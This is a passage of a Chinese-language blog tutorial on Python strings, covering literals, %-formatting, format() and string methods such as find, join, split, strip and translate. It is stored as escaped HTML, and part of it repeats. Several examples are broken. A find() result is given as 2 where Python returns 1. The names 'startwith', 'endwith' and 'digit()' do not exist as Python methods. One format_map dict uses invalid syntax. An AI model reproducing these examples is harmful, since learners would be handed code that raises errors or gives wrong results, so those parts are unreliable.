href=\"#isspace-字符串只包含空格\" class=\"headerlink\" title=\"isspace()#字符串只包含空格\"></a>isspace()#字符串只包含空格</h5><h5 id=\"istitle-字符串是否是标题化的\"><a href=\"#istitle-字符串是否是标题化的\" class=\"headerlink\" title=\"istitle()#字符串是否是标题化的\"></a>istitle()#字符串是否是标题化的</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'This Is Op'</span>.istitle()   <span class=\"comment\">#True</span></span><br><span class=\"line\"><span class=\"string\">'this Is Op'</span>.istitle()   <span class=\"comment\">#False</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>title()用于将字符串标题化，即单词首字母大写</li>\n</ul>\n<h4 id=\"J\"><a href=\"#J\" class=\"headerlink\" title=\"J\"></a>J</h4><h5 id=\"join-将一个序列以分隔符分割合并为一个字符串\"><a href=\"#join-将一个序列以分隔符分割合并为一个字符串\" class=\"headerlink\" title=\"join()  #将一个序列以分隔符分割合并为一个字符串\"></a>join()  #将一个序列以分隔符分割合并为一个字符串</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">''</span>.join((<span class=\"string\">'a'</span>,<span class=\"string\">'b'</span>,<span class=\"string\">'c'</span>))   <span class=\"comment\">#'abc'</span></span><br><span class=\"line\"><span class=\"string\">'_'</span>.join([<span class=\"string\">'a'</span>,<span class=\"string\">'b'</span>,<span class=\"string\">'c'</span>])  <span class=\"comment\">#'a_b_c'</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>即以字符串为分隔符，将一个序列合并为一个字符串</li>\n</ul>\n<h5 id=\"split-以指定字符串为分隔符分割一个字符串为一个列表\"><a href=\"#split-以指定字符串为分隔符分割一个字符串为一个列表\" class=\"headerlink\" title=\"split() #以指定字符串为分隔符分割一个字符串为一个列表\"></a>split() #以指定字符串为分隔符分割一个字符串为一个列表</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'abc'</span>.split(<span class=\"string\">'b'</span>)       <span class=\"comment\">#['a','c']</span></span><br><span class=\"line\"><span class=\"string\">'a_b_c'</span>.split(<span class=\"string\">'_'</span>)     <span class=\"comment\">#['a','b','c']</span></span><br><span class=\"line\"><span class=\"string\">'a_b_c'</span>.split(<span class=\"string\">'_'</span>,<span class=\"number\">1</span>)   <span class=\"comment\">#['a','b_c']</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>第一个参数是分隔符，第二个参数是分割的次数</li>\n<li>splitlines() #默认是以\\n、\\r、\\r\\n作为分隔符</li>\n<li>rsplit()表示从右边开始进行分割</li>\n</ul>\n<h4 id=\"L\"><a href=\"#L\" class=\"headerlink\" title=\"L\"></a>L</h4><h5 id=\"lower-将字符串中的字母字符变为小写\"><a href=\"#lower-将字符串中的字母字符变为小写\" class=\"headerlink\" title=\"lower() #将字符串中的字母字符变为小写\"></a>lower() #将字符串中的字母字符变为小写</h5><h5 id=\"upper-变大写\"><a href=\"#upper-变大写\" class=\"headerlink\" title=\"upper() #变大写\"></a>upper() #变大写</h5><h4 id=\"M\"><a href=\"#M\" class=\"headerlink\" title=\"M\"></a>M</h4><h5 id=\"maketrans-设置转换规则\"><a href=\"#maketrans-设置转换规则\" class=\"headerlink\" title=\"maketrans() #设置转换规则\"></a>maketrans() #设置转换规则</h5><h5 id=\"translate-根据规则进行转换\"><a href=\"#translate-根据规则进行转换\" class=\"headerlink\" title=\"translate() #根据规则进行转换\"></a>translate() #根据规则进行转换</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">res=str.maketrans(<span class=\"string\">'abcd'</span>,<span class=\"string\">'1234'</span>)    <span class=\"comment\">#设置规则</span></span><br><span class=\"line\"><span class=\"string\">'abcd'</span>.translate(res)     <span class=\"comment\">#'1234'</span></span><br><span class=\"line\"><span class=\"string\">'abcA'</span>.translate(res)     <span class=\"comment\">#'123A'</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"R\"><a href=\"#R\" class=\"headerlink\" title=\"R\"></a>R</h4><h5 id=\"replace-对应替换\"><a href=\"#replace-对应替换\" class=\"headerlink\" title=\"replace() #对应替换\"></a>replace() #对应替换</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'abc'</span>.replace(<span class=\"string\">'b'</span>,<span class=\"string\">'B'</span>)    <span class=\"comment\">#'aBc'</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>本质是产生了一个新的字符串，因为字符串时不可变对象</li>\n</ul>\n<h4 id=\"S\"><a href=\"#S\" class=\"headerlink\" title=\"S\"></a>S</h4><h5 id=\"strip-脱掉字符串两端的指定字符串\"><a href=\"#strip-脱掉字符串两端的指定字符串\" class=\"headerlink\" title=\"strip() #脱掉字符串两端的指定字符串\"></a>strip() #脱掉字符串两端的指定字符串</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'abc\\n'</span>.strip()      <span class=\"comment\">#'abc'</span></span><br><span class=\"line\"><span class=\"string\">'abca'</span>.strip(<span class=\"string\">'a'</span>)    <span class=\"comment\">#'bc'</span></span><br><span class=\"line\"></span><br><span class=\"line\">a=<span class=\"string\">'abc'</span></span><br><span class=\"line\">a.strip(<span class=\"string\">'c'</span>)   <span class=\"comment\">#'ab'</span></span><br><span class=\"line\">print(a)       <span class=\"comment\">#'abc'</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>不指定字符串默认脱掉换行符、制表符等</li>\n<li>脱掉并返回脱掉后剩下的字符串</li>\n<li>==该操作不会对原字符串产生影响，因为字符串是不可变的。该操作只是产生一个新的字符串，原字符串仍然未变，效果就是字符串只是暂时脱掉而已==</li>\n<li>lstrip()表示只脱掉最左端的</li>\n<li>rstrip()表示只脱最右边的</li>\n</ul>\n<h5 id=\"swapcase-大小写翻转，大写变小写，小变大\"><a href=\"#swapcase-大小写翻转，大写变小写，小变大\" class=\"headerlink\" title=\"swapcase()#大小写翻转，大写变小写，小变大\"></a>swapcase()#大小写翻转，大写变小写，小变大</h5><h5 id=\"zfill-右对齐，不足填0\"><a href=\"#zfill-右对齐，不足填0\" class=\"headerlink\" title=\"zfill()#右对齐，不足填0\"></a>zfill()#右对齐，不足填0</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'abc'</span>.zfill(<span class=\"number\">5</span>)    <span class=\"comment\">#'00abc'</span></span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<h3 id=\"0x00-字符串概述\"><a href=\"#0x00-字符串概述\" class=\"headerlink\" title=\"0x00 字符串概述\"></a>0x00 字符串概述</h3><p>字符串是不可变的序列。</p>\n<p>Python3.0字符串分3中类型：str用于Unicode文本；bytes用于二进制文本；bytearray是bytes的变体。</p>\n<h3 id=\"0x01-字符串\"><a href=\"#0x01-字符串\" class=\"headerlink\" title=\"0x01 字符串\"></a>0x01 字符串</h3><h4 id=\"1-字符串常量：\"><a href=\"#1-字符串常量：\" class=\"headerlink\" title=\"1.字符串常量：\"></a>1.字符串常量：</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'string'</span></span><br><span class=\"line\"><span class=\"string\">\"string\"</span></span><br><span class=\"line\"><span class=\"string\">'''string'''</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"string\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">r'string'</span>     <span class=\"comment\">#Raw字符串</span></span><br><span class=\"line\"><span class=\"string\">b'string'</span>     <span class=\"comment\">#bytes字符串</span></span><br></pre></td></tr></table></figure>","more":"<h4 id=\"2-字符串操作\"><a href=\"#2-字符串操作\" class=\"headerlink\" title=\"2.字符串操作\"></a>2.字符串操作</h4><ul>\n<li>索引：<code>str[下标]</code></li>\n<li>切片：<code>str[下标开始:下标结束：步长]</code>    #步长默认为1</li>\n<li>合并：<code>+</code>、<code>*</code></li>\n<li>类型强制转换：<code>str()</code></li>\n<li>修改字符串：可以通过产生新对象后重新赋值给原变量。</li>\n</ul>\n<h4 id=\"3-字符串格式化：\"><a href=\"#3-字符串格式化：\" class=\"headerlink\" title=\"3.字符串格式化：\"></a>3.字符串格式化：</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">\"this is %s\"</span> %<span class=\"string\">'collision'</span>               <span class=\"comment\">#字符串形式</span></span><br><span class=\"line\"><span class=\"string\">\"%s is %s boy\"</span>%(<span class=\"string\">\"collision\"</span>,<span class=\"string\">\"good\"</span>)     <span class=\"comment\">#元组形式</span></span><br><span class=\"line\"><span class=\"string\">\"%(x)d,%(y)d\"</span>%&#123;<span class=\"string\">\"x\"</span>:<span class=\"number\">1</span>,<span class=\"string\">\"y\"</span>:<span class=\"number\">2</span>&#125;             <span class=\"comment\">#字典形式</span></span><br></pre></td></tr></table></figure>\n<p>format格式化</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'a&#123;&#125;c&#123;&#125;'</span>.format(<span class=\"string\">'b'</span>,<span class=\"string\">'d'</span>)</span><br><span class=\"line\"><span class=\"string\">'a&#123;0&#125;c&#123;1&#125;'</span>.format(<span class=\"string\">'b'</span>,<span class=\"string\">'d'</span>)</span><br><span class=\"line\"><span class=\"string\">'a&#123;name&#125;c&#123;age&#125;'</span>.format(name=<span class=\"string\">'b'</span>,age=<span class=\"string\">'d'</span>)</span><br><span class=\"line\"><span class=\"string\">'a&#123;name&#125;c&#123;age&#125;'</span>.format_map(&#123;<span class=\"string\">'name'</span>:<span class=\"string\">'b'</span>,<span class=\"string\">'age'</span>=<span class=\"string\">'d'</span>&#125;)</span><br></pre></td></tr></table></figure>\n<h3 id=\"0x02-字符串方法：\"><a href=\"#0x02-字符串方法：\" class=\"headerlink\" title=\"0x02 字符串方法：\"></a>0x02 字符串方法：</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查找：</span><br><span class=\"line\">\tcount()          <span class=\"comment\">#返回字符或字符串在字符串中出现的次数</span></span><br><span class=\"line\">\tfind()、rfind()  <span class=\"comment\">#查找字符或字符串返回第一次出现时的下标</span></span><br><span class=\"line\">\tindex()          <span class=\"comment\">#返回字符或字符串在字符串中的下标\t</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tPS:find()与index()区别在于，find对不存在的字符串查找会返回<span class=\"number\">-1</span>，而index会报错。</span><br><span class=\"line\"></span><br><span class=\"line\">判断：</span><br><span class=\"line\">\tstartswith()、endswith()     <span class=\"comment\">#判断字符或字符串的开始与结尾</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tisalpha()        <span class=\"comment\">#判断字符串是否是字母组成\t</span></span><br><span class=\"line\">\tisnumeric()      <span class=\"comment\">#字符串只包含数字字符\t</span></span><br><span class=\"line\">\tisalnum()        <span class=\"comment\">#判断字符串是否是字母或数字组</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tisdecimal()      <span class=\"comment\">#判断字符串是否是十进制数字</span></span><br><span class=\"line\">\tisdigit()        <span class=\"comment\">#判断字符串是否是数字组成</span></span><br><span class=\"line\">\tislower()        <span class=\"comment\">#字母字符是否都是小写字母</span></span><br><span class=\"line\">\tisupper()        <span class=\"comment\">#都是大写</span></span><br><span class=\"line\">\t\t</span><br><span class=\"line\">操作：</span><br><span class=\"line\">\tjoin()     <span class=\"comment\">#将字符串作为分隔符，合并一个序列为一个字符串。\t</span></span><br><span class=\"line\">\t\tPS：序列的元素要求是字符串才可以。</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\tsplit()    <span class=\"comment\">#以指定字符串为分隔符分割一个字符串为一个列表\t</span></span><br><span class=\"line\">\treplace()  <span class=\"comment\">#对应替换\t\t\t\t\t\t\t\t</span></span><br><span class=\"line\">\tstrip()    <span class=\"comment\">#脱掉字符串两端的指定字符串（默认脱空格）\t\t</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">\tlower()    <span class=\"comment\">#将字符串中的字母字符变为小写</span></span><br><span class=\"line\">\tupper()    <span class=\"comment\">#变大写</span></span><br><span class=\"line\"></span><br><span class=\"line\">编码：</span><br><span class=\"line\">\t<span class=\"string\">'abc'</span>.encode(<span class=\"string\">'utf-8'</span>)</span><br></pre></td></tr></table></figure>\n<h4 id=\"字符串方法\"><a href=\"#字符串方法\" class=\"headerlink\" title=\"字符串方法\"></a><strong>字符串方法</strong></h4><h4 id=\"C\"><a href=\"#C\" class=\"headerlink\" title=\"C\"></a>C</h4><h5 id=\"capitalize-将字符串首字符大写\"><a href=\"#capitalize-将字符串首字符大写\" class=\"headerlink\" title=\"capitalize() #将字符串首字符大写\"></a>capitalize() #将字符串首字符大写</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'abc'</span>.capitalize()   <span class=\"comment\">#返回'Abc'</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>若首字符是字母之外的则不做改变。</li>\n</ul>\n<h5 id=\"center-居中字符串并填充\"><a href=\"#center-居中字符串并填充\" class=\"headerlink\" title=\"center() #居中字符串并填充\"></a>center() #居中字符串并填充</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'abc'</span>.center(<span class=\"number\">50</span>)      <span class=\"comment\">#居中字符串，不足50个字符用空格填充</span></span><br><span class=\"line\"><span class=\"string\">'abc'</span>.center(<span class=\"number\">50</span>,<span class=\"string\">'-'</span>)  <span class=\"comment\">#字符串不足50个字符时，用'-'在两边进行填充</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>数量为奇数时，优先填充右边。</li>\n<li>ljust()为左对齐填充。</li>\n<li>rjust()为右对齐填充。</li>\n</ul>\n<h5 id=\"count-返回字符或字符串在字符串中出现的次数\"><a href=\"#count-返回字符或字符串在字符串中出现的次数\" class=\"headerlink\" title=\"count() #返回字符或字符串在字符串中出现的次数\"></a>count() #返回字符或字符串在字符串中出现的次数</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'abcac'</span>.count(<span class=\"string\">'a'</span>)     <span class=\"comment\">#返回2</span></span><br><span class=\"line\"><span class=\"string\">'abcacac'</span>.count(<span class=\"string\">'ac'</span>)  <span class=\"comment\">#返回2</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"E\"><a href=\"#E\" class=\"headerlink\" title=\"E\"></a>E</h4><h5 id=\"encode-对字符串进行编码\"><a href=\"#encode-对字符串进行编码\" class=\"headerlink\" title=\"encode() #对字符串进行编码\"></a>encode() #对字符串进行编码</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'abc'</span>.encode(<span class=\"string\">'utf-8'</span>)   <span class=\"comment\">#等同于b'abc',因为默认编码utf-8</span></span><br><span class=\"line\"><span class=\"string\">'abc'</span>.encode(<span class=\"string\">'gb2312'</span>)</span><br></pre></td></tr></table></figure>\n<ul>\n<li>编码即将字符串以特定编码方式转为二进制。</li>\n</ul>\n<h5 id=\"startwith-、endwith-判断字符串开始与结尾\"><a href=\"#startwith-、endwith-判断字符串开始与结尾\" class=\"headerlink\" title=\"startwith()、endwith() #判断字符串开始与结尾\"></a>startwith()、endwith() #判断字符串开始与结尾</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'abc'</span>.startwith(<span class=\"string\">'ab'</span>)  <span class=\"comment\">#返回True</span></span><br><span class=\"line\"><span class=\"string\">'abc'</span>.endwith(<span class=\"string\">'bc'</span>)    <span class=\"comment\">#返回True</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"F\"><a href=\"#F\" class=\"headerlink\" title=\"F\"></a>F</h4><h5 id=\"find-、rfind-查找字符串返回下标\"><a href=\"#find-、rfind-查找字符串返回下标\" class=\"headerlink\" title=\"find()、rfind() #查找字符串返回下标\"></a>find()、rfind() #查找字符串返回下标</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'abcd'</span>.find(<span class=\"string\">'bc'</span>)    <span class=\"comment\">#返回2</span></span><br><span class=\"line\"><span class=\"string\">'abccd'</span>.rfind(<span class=\"string\">'c'</span>)   <span class=\"comment\">#返回最右边c的下标3</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>rfind()返回的是最右边匹配的字符串的下标。</li>\n<li>查找的字符串不存在时，返回-1</li>\n</ul>\n<h5 id=\"format-、format-map-字符串格式化\"><a href=\"#format-、format-map-字符串格式化\" class=\"headerlink\" title=\"format()、format_map()#字符串格式化\"></a>format()、format_map()#字符串格式化</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'a&#123;&#125;c&#123;&#125;'</span>.format(<span class=\"string\">'b'</span>,<span class=\"string\">'d'</span>)</span><br><span class=\"line\"><span class=\"string\">'a&#123;name&#125;c&#123;age&#125;'</span>.format(name=<span class=\"string\">'b'</span>,age=<span class=\"string\">'d'</span>)</span><br><span class=\"line\"><span class=\"string\">'a&#123;name&#125;c&#123;age&#125;'</span>.format_map(&#123;<span class=\"string\">'name'</span>:<span class=\"string\">'b'</span>,<span class=\"string\">'age'</span>:<span class=\"string\">'d'</span>&#125;)</span><br></pre></td></tr></table></figure>\n<h4 id=\"I\"><a href=\"#I\" class=\"headerlink\" title=\"I\"></a>I</h4><h5 id=\"index-返回字符或字符串在字符串中的下标\"><a href=\"#index-返回字符或字符串在字符串中的下标\" class=\"headerlink\" title=\"index() #返回字符或字符串在字符串中的下标\"></a>index() #返回字符或字符串在字符串中的下标</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'abc'</span>.index(<span class=\"string\">'b'</span>)    <span class=\"comment\">#返回1</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>与find()区别在于，不存在字符串时会报错</li>\n</ul>\n<h5 id=\"isalnum-判断字符串是否是字母或数字组成\"><a href=\"#isalnum-判断字符串是否是字母或数字组成\" class=\"headerlink\" title=\"isalnum() #判断字符串是否是字母或数字组成\"></a>isalnum() #判断字符串是否是字母或数字组成</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'abc123'</span>.isalnum()  <span class=\"comment\">#True</span></span><br><span class=\"line\"><span class=\"string\">'abc'</span>.isalnum()     <span class=\"comment\">#True</span></span><br><span class=\"line\"><span class=\"string\">'123'</span>.isalnum()     <span class=\"comment\">#True</span></span><br><span class=\"line\"><span class=\"string\">'abc\\n1'</span>.isalnum()  <span class=\"comment\">#False</span></span><br><span class=\"line\"><span class=\"string\">'abc1.1'</span>.isalnum()  <span class=\"comment\">#False</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"isalpha-判断字符串是否是字母组成\"><a href=\"#isalpha-判断字符串是否是字母组成\" class=\"headerlink\" title=\"isalpha() #判断字符串是否是字母组成\"></a>isalpha() #判断字符串是否是字母组成</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'aBc'</span>.isalpha()    <span class=\"comment\">#True</span></span><br><span class=\"line\"><span class=\"string\">'aB2'</span>.isalpha()    <span class=\"comment\">#False</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"isdecimal-判断字符串是否是十进制数字\"><a href=\"#isdecimal-判断字符串是否是十进制数字\" class=\"headerlink\" title=\"isdecimal() #判断字符串是否是十进制数字\"></a>isdecimal() #判断字符串是否是十进制数字</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'12'</span>.isdecimal()   <span class=\"comment\">#True</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"isdigit-判断字符串是否是数字组成\"><a href=\"#isdigit-判断字符串是否是数字组成\" class=\"headerlink\" title=\"isdigit() #判断字符串是否是数字组成\"></a>isdigit() #判断字符串是否是数字组成</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'123'</span>.digit()    <span class=\"comment\">#True</span></span><br><span class=\"line\"><span class=\"string\">'a1x2'</span>.digit()   <span class=\"comment\">#False</span></span><br></pre></td></tr></table></figure>\n<h5 id=\"islower-字母字符是否都是小写字母\"><a href=\"#islower-字母字符是否都是小写字母\" class=\"headerlink\" title=\"islower() #字母字符是否都是小写字母\"></a>islower() #字母字符是否都是小写字母</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'abc123'</span>.islower()   <span class=\"comment\">#True</span></span><br><span class=\"line\"><span class=\"string\">'Aabc'</span>.islower()     <span class=\"comment\">#False</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>字符串可以存在其他字符，只要字母字符是小写即可True.</li>\n<li>isupper()与之相反，不在赘述</li>\n</ul>\n<h5 id=\"isidentifier-判断字符串可否符合变量名命名规则\"><a href=\"#isidentifier-判断字符串可否符合变量名命名规则\" class=\"headerlink\" title=\"isidentifier()#判断字符串可否符合变量名命名规则\"></a>isidentifier()#判断字符串可否符合变量名命名规则</h5><h5 id=\"isnumeric-字符串只包含数字字符\"><a href=\"#isnumeric-字符串只包含数字字符\" class=\"headerlink\" title=\"isnumeric() #字符串只包含数字字符\"></a>isnumeric() #字符串只包含数字字符</h5><h5 id=\"isspace-字符串只包含空格\"><a href=\"#isspace-字符串只包含空格\" class=\"headerlink\" title=\"isspace()#字符串只包含空格\"></a>isspace()#字符串只包含空格</h5><h5 id=\"istitle-字符串是否是标题化的\"><a href=\"#istitle-字符串是否是标题化的\" class=\"headerlink\" title=\"istitle()#字符串是否是标题化的\"></a>istitle()#字符串是否是标题化的</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'This Is Op'</span>.istitle()   <span class=\"comment\">#True</span></span><br><span class=\"line\"><span class=\"string\">'this Is Op'</span>.istitle()   <span class=\"comment\">#False</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>title()用于将字符串标题化，即单词首字母大写</li>\n</ul>\n<h4 id=\"J\"><a href=\"#J\" class=\"headerlink\" title=\"J\"></a>J</h4><h5 id=\"join-将一个序列以分隔符分割合并为一个字符串\"><a href=\"#join-将一个序列以分隔符分割合并为一个字符串\" class=\"headerlink\" title=\"join()  #将一个序列以分隔符分割合并为一个字符串\"></a>join()  #将一个序列以分隔符分割合并为一个字符串</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">''</span>.join((<span class=\"string\">'a'</span>,<span class=\"string\">'b'</span>,<span class=\"string\">'c'</span>))   <span class=\"comment\">#'abc'</span></span><br><span class=\"line\"><span class=\"string\">'_'</span>.join([<span class=\"string\">'a'</span>,<span class=\"string\">'b'</span>,<span class=\"string\">'c'</span>])  <span class=\"comment\">#'a_b_c'</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>即以字符串为分隔符，将一个序列合并为一个字符串</li>\n</ul>\n<h5 id=\"split-以指定字符串为分隔符分割一个字符串为一个列表\"><a href=\"#split-以指定字符串为分隔符分割一个字符串为一个列表\" class=\"headerlink\" title=\"split() #以指定字符串为分隔符分割一个字符串为一个列表\"></a>split() #以指定字符串为分隔符分割一个字符串为一个列表</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'abc'</span>.split(<span class=\"string\">'b'</span>)       <span class=\"comment\">#['a','c']</span></span><br><span class=\"line\"><span class=\"string\">'a_b_c'</span>.split(<span class=\"string\">'_'</span>)     <span class=\"comment\">#['a','b','c']</span></span><br><span class=\"line\"><span class=\"string\">'a_b_c'</span>.split(<span class=\"string\">'_'</span>,<span class=\"number\">1</span>)   <span class=\"comment\">#['a','b_c']</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>第一个参数是分隔符，第二个参数是分割的次数</li>\n<li>splitlines() #默认是以\\n、\\r、\\r\\n作为分隔符</li>\n<li>rsplit()表示从右边开始进行分割</li>\n</ul>\n<h4 id=\"L\"><a href=\"#L\" class=\"headerlink\" title=\"L\"></a>L</h4><h5 id=\"lower-将字符串中的字母字符变为小写\"><a href=\"#lower-将字符串中的字母字符变为小写\" class=\"headerlink\" title=\"lower() #将字符串中的字母字符变为小写\"></a>lower() #将字符串中的字母字符变为小写</h5><h5 id=\"upper-变大写\"><a href=\"#upper-变大写\" class=\"headerlink\" title=\"upper() #变大写\"></a>upper() #变大写</h5><h4 id=\"M\"><a href=\"#M\" class=\"headerlink\" title=\"M\"></a>M</h4><h5 id=\"maketrans-设置转换规则\"><a href=\"#maketrans-设置转换规则\" class=\"headerlink\" title=\"maketrans() #设置转换规则\"></a>maketrans() #设置转换规则</h5><h5 id=\"translate-根据规则进行转换\"><a href=\"#translate-根据规则进行转换\" class=\"headerlink\" title=\"translate() #根据规则进行转换\"></a>translate() #根据规则进行转换</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">res=str.maketrans(<span class=\"string\">'abcd'</span>,<span class=\"string\">'1234'</span>)    <span class=\"comment\">#设置规则</span></span><br><span class=\"line\"><span class=\"string\">'abcd'</span>.translate(res)     <span class=\"comment\">#'1234'</span></span><br><span class=\"line\"><span class=\"string\">'abcA'</span>.translate(res)     <span class=\"comment\">#'123A'</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"R\"><a href=\"#R\" class=\"headerlink\" title=\"R\"></a>R</h4><h5 id=\"replace-对应替换\"><a href=\"#replace-对应替换\" class=\"headerlink\" title=\"replace() #对应替换\"></a>replace() #对应替换</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'abc'</span>.replace(<span class=\"string\">'b'</span>,<span class=\"string\">'B'</span>)    <span 